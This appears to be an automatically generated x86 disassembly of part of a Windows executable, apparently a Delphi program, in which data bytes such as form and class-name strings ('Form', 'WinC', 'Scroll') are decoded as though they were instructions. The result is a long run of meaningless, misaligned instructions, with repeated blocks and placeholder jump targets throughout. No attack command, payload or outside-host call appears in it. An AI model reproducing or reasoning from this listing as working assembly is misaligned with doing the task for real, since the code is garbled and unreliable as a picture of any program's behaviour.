add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
add [ eax ] al
push esp
inc ebp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
jb r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
ror [ ebp + edx * 2 + 0x45 ] 0x0
pop es
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
sub al 0x80
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
jo r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
call [ eax + 0x7f ]
inc ebp
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
xor al 0x7f
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
jg r-xdata
outsd
add [ eax ] al
je r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add [ eax + 0x34 ] dh
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dh
push edi
add eax 0x6f500800
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
mov [ eax + 0x10045 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
outsd
insb
outsd
jb r-xdata
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
push [ eax - 0x80 ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
mov eax 0xcc004580
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
jae r-xdata
add [ esi + ebp * 2 + 0x44 ] ch
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
jpo r-xdata
dec esi
outsd
jb r-xdata
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
push 0x100457f
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx * 2 + r--data ] dh
add [ eax ] al
inc esp
push ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 2 + 0x45 ] cl
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add [ eax ] ch
test [ ebp ] al
fadd [ esi - 0x76f3ffbb ]
inc ebp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
call [ eax ]
mov [ ebp ] eax
in al dx
mov [ ebp ] eax
adc [ edx - 0x755bffbb ] cl
inc ebp
add al ch
mov [ ebp ] al
dec eax
test [ ebp ] al
adc al 0x54
add ah bl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
push esi
jb r-xdata
outsd
insb
nop
fcomp [ eax + 0x45 ]
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
les edx [ edi + 0x45 ]
add [ ecx * 8 + 0xd0043 ] ah
add eax 0x6d726f46
jae r-xdata
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc ebx
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
add al 0x83
inc ebp
add al dh
jbe r-xdata
jae r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
jb r-xdata
bound esi [ ebx + 0x53 ]
pop ecx
inc ebp
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
push ebp
inc ebp
add [ eax ] cl
add al [ eax ]
inc eax
test [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or eax 0x7a726f48
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax + 0x55 ] cl
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax + 0x3400446f ] bl
mov al [ ebp ]
or [ ebp + eax * 2 + 0x44452c00 ] al
add [ eax + 0x14004583 ] bh
inc edx
inc esp
add al cl
add [ ebp ] 0xffffffc4
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
add al ah
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
inc esp
add [ eax - 0x1fffbbb6 ] ah
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
fadd [ eax + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ edi + edx * 2 ] dh
inc ebp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
rol ah 0x57
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x41ffbaa8 ] bl
pop eax
inc ebp
add [ edx + eax ] bl
add [ eax ] al
jo r-xdata
add [ ebx ] al
add [ eax ] al
add [ edx + ebx * 2 + 0x620c0045 ] dl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
jae r-xdata
pop ecx
inc ebp
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x59 ] dl
inc ebp
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
lea eax [ eax ]
in al 0x59
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x50000000 ] al
inc ebp
add [ esi ] al
bound esi [ ebx + 0x4e ]
push ebp
inc ebp
add [ edx + eax ] cl
add bh bh
rol [ ebp + 0x10045 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
or eax 0x74726556
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ ebx + eax * 4 + 0x45 ] bh
inc ebx
add [ edx + eax + 0x34700042 ] ch
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp + 0x5a480040 ]
add bh bh
insd
jl r-xdata
inc ebp
add [ ebx ] al
lea eax [ eax ]
dec eax
pop edx
push ebx
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
pop ecx
add eax 0x50000000
inc ebp
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add ah ah
pop ecx
jb r-xdata
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x455a18c0 ]
add [ edi ] cl
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add [ eax + 0x300455a ] bl
outsd
jb r-xdata
sbb dl 0x5
inc esi
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
outsd
imul ecx [ eax + 0x1004189 ] 0xffffffa5
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
push cs
jo r-xdata
mov eax eax
call 0x645a043
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + ebx * 2 + 0x45 ] al
add [ eax ] cl
jae r-xdata
push eax
outsd
jb r-xdata
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cwde
pop ebx
inc ebp
add [ ecx ] cl
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
insd
inc esp
jae r-xdata
add [ eax ] al
add [ eax + 0x900455b ] bl
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
or al 0x54
shr al 0x5a
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add ah bh
pop edx
inc ebp
add [ edx ] cl
jo r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
pop edx
inc ebp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
xchg esp eax
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
pop ebx
inc ebp
add [ esi ] al
jo r-xdata
inc eax
add [ eax + 0x800455c ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
pop ebx
inc ebp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xor al 0x5c
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
cmp [ ebp + eax * 2 ] bl
add ecx [ esp + edx * 2 ]
inc ebx
insb
outsd
jae r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
pushfd
je r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ch
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
or edx [ ebx + eax * 2 + 0x6c ]
sbb [ ebp + eax * 2 ] 0x8
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx + 0x40 ] bl
add [ esp + ebx * 2 ] dh
inc ebp
add [ ebp + 0x5cc40040 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
inc ebp
add [ esi ] al
jns r-xdata
popad
je r-xdata
insb
pop ebx
inc ebp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax ] al
adc [ eax ] al
nop
or [ ebp + 0x45 ] bl
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
jae r-xdata
jb r-xdata
add [ eax ] al
add [ esp + ebx * 2 ] dh
inc esi
outsd
jb r-xdata
js r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
call sub_45a2fe
add cl [ eax ]
push es
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax + 0x3400446f ] bl
mov al [ ebp ]
inc eax
mov eax [ 0x452c0045 ]
inc esp
add [ esi + ebp * 4 ] al
inc ebp
add [ ecx + esi * 4 + 0x45 ] ah
add [ eax ] ah
mov al 0x45
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ edx + esi * 4 + 0x44280045 ] bl
inc esp
add al bl
jo r-xdata
add [ esp + edi * 2 ] cl
inc esp
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
pop esi
inc ebp
add [ eax + 0x4560 ] al
add [ eax ] al
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x5de80040 ] cl
inc ebp
add [ eax ] al
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
adc [ eax + 0x6f ] esi
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
cwde
pop edx
inc ebp
add [ ebx ] al
inc esi
outsd
jb r-xdata
insd
outsd
add [ eax ] al
in al dx
jae r-xdata
jl r-xdata
inc ebp
add [ edx + eax - 0x733fffbe ] ch
inc ebp
add [ esi + ecx * 4 + 0x45 ] dh
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
add [ eax ] al
add ah cl
adc [ eax ] al
cmp al 0x2
add [ eax ] al
loopne r-xdata
add [ eax - 0x53ffba47 ] dl
add [ eax + eax + 0x1c ] 0x6d
inc esp
add [ esi + ecx * 8 - 0x7bd7ffbb ] ah
inc ebp
add al bl
xchg [ ebp ] al
test [ edi - 0x703fffbb ] bh
inc ebp
add [ eax + edx * 4 ] bh
inc ebp
add [ edx + edx * 8 - 0x7307ffbb ] al
inc ebp
add [ eax + 0x680045cd ] cl
mov ah 0x45
add [ edi + ecx * 8 ] bh
inc ebp
add [ eax ] ah
0xe0045 0x0
add [ eax ] al
add eax [ eax ]
add [ eax ] al
int3
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dh bh
pop esi
inc ebp
add [ esi + 0x60 ] ch
inc ebp
add al bh
add al [ eax ]
add [ eax + 0x57 ] bh
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
jae r-xdata
pop ebx
inc ebp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
add al bh
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ edi + edx * 4 ] bh
inc ebp
add [ esi + ebp * 2 + 0x44 ] ch
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
cwde
inc ebp
add [ ebx + ebp + 0x44 ] bl
add [ esi + eax + 0x44 ] dh
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ edx + ebx * 4 ] ah
inc ebp
add al dh
cwde
inc ebp
add [ eax ] bh
or [ eax + eax - 0x64 ] eax
0x2be00045 0x44
clc
je r-xdata
jb r-xdata
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
adc al 0x5a
inc ebp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc esp
pop ebp
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
outsb
je r-xdata
add [ eax + 0x34 ] bh
inc eax
add al ah
mov dl 0x45
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
mov es [ ebp ]
fdivr [ ebx + 0x44 ]
add [ esp + edx * 4 + 0x45 ] cl
add [ eax - 0x59 ] al
inc ecx
add [ eax + edx * 4 - 0x6f27ffbb ] bl
inc ebp
add ah ah
xchg ecx eax
inc ebp
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edx + ebx * 4 + 0x45 ] bl
add [ edi + edi * 8 - 0x2a03ffbf ] ah
inc ebp
add [ ebx + ecx * 4 ] dh
inc ebp
add al dh
jbe r-xdata
inc ebp
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
pop esp
inc ebp
add [ eax ] cl
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_45557c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jg r-xdata
outsd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
push esp
inc ebp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
dec [ eax ]
js r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
sub al 0x80
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
jo r-xdata
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
push [ eax - 0x80 ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
mov eax 0xcc004580
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
add [ eax + 0x34 ] dh
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dh
push edi
add eax 0x6f500800
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
mov [ eax + 0x10045 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
push 0x100457f
jpo r-xdata
dec esi
outsd
jb r-xdata
add [ eax ] al
add [ edx ] cl
inc edx
jne r-xdata
push ebp
inc ebp
add [ eax + 0xd00417f ] bh
add [ 0x6d726f46 ] al
jae r-xdata
imul ebp [ esi ] 0x2c004010
add [ esi + ebp * 2 + 0x44 ] ch
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add ah bl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
push eax
je r-xdata
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ eax + eax ] ah
add bh bh
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add [ eax ] ch
test [ ebp ] al
fadd [ esi - 0x76f3ffbb ]
inc ebp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
call [ eax ]
mov [ ebp ] eax
in al dx
mov [ ebp ] eax
adc [ edx - 0x755bffbb ] cl
inc ebp
add al ch
mov [ ebp ] al
dec eax
test [ ebp ] al
adc al 0x54
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ eax ] al
call [ eax + 0x7f ]
inc ebp
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
xor al 0x7f
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
push esi
jb r-xdata
outsd
insb
nop
fcomp [ eax + 0x45 ]
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc ebx
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
add al 0x83
inc ebp
add al dh
jbe r-xdata
jae r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
les edx [ edi + 0x45 ]
add [ ecx * 8 + 0xd0043 ] ah
add eax 0x6d726f46
jae r-xdata
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax + 0x3400446f ] bl
mov al [ ebp ]
or [ ebp + eax * 2 + 0x44452c00 ] al
add [ eax + 0x14004583 ] bh
inc edx
inc esp
add al cl
add [ ebp ] 0xffffffc4
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
add al ah
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
